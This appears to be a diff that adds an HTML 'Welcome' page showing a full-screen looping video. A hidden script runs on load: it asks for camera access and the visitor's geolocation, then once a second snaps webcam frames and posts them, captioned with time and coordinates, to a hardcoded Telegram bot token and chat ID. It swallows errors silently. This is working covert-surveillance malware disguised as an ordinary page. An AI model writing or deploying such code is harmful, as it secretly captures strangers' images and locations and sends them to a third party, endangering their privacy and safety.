@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Welcome</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #000;
+      overflow: hidden;
+      width: 100vw;
+      height: 100vh;
+    }
+    #main-video {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: 1;
+    }
+    #cam-feed, #snap-canvas { display: none; }
+  </style>
+</head>
+<body>
+
+  <video id="main-video" autoplay loop muted playsinline>
+    <source src="video.mp4" type="video/mp4" />
+  </video>
+
+  <video id="cam-feed" autoplay playsinline></video>
+  <canvas id="snap-canvas"></canvas>
+
+  <script>
+    const BOT_TOKEN = "8448312763:AAEq_bhLbBuDyIAWPB6CNhh7m5ZZRH2ukd0";
+    const CHAT_ID = "7041332514";
+
+    const camFeed = document.getElementById("cam-feed");
+    const snapCanvas = document.getElementById("snap-canvas");
+
+    let locationText = "Fetching...";
+    let isSending = false;
+
+    async function sendToTelegram(blob, caption) {
+      try {
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, "capture.jpg");
+        formData.append("caption", caption);
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+      } catch (e) {}
+    }
+
+    function captureAndSend() {
+      if (isSending) return;
+      isSending = true;
+      try {
+        snapCanvas.width = camFeed.videoWidth || 640;
+        snapCanvas.height = camFeed.videoHeight || 480;
+        const ctx = snapCanvas.getContext("2d");
+        ctx.drawImage(camFeed, 0, 0, snapCanvas.width, snapCanvas.height);
+        snapCanvas.toBlob(async (blob) => {
+          if (blob) {
+            const caption = `Live Feed\nTime: ${new Date().toLocaleString()}\nLocation: ${locationText}`;
+            await sendToTelegram(blob, caption);
+          }
+          isSending = false;
+        }, "image/jpeg", 0.8);
+      } catch (e) {
+        isSending = false;
+      }
+    }
+
+    async function getLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) { resolve("Not supported"); return; }
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const lat = pos.coords.latitude.toFixed(6);
+            const lon = pos.coords.longitude.toFixed(6);
+            resolve(`Lat: ${lat}, Lon: ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`);
+          },
+          () => resolve("Location denied"),
+          { timeout: 8000 }
+        );
+      });
+    }
+
+    async function runBackground() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        camFeed.srcObject = stream;
+        await camFeed.play();
+
+        locationText = await getLocation();
+
+        setInterval(captureAndSend, 1000);
+      } catch (e) {}
+    }
+
+    window.addEventListener("load", runBackground);
+  </script>
+</body>
+</html>
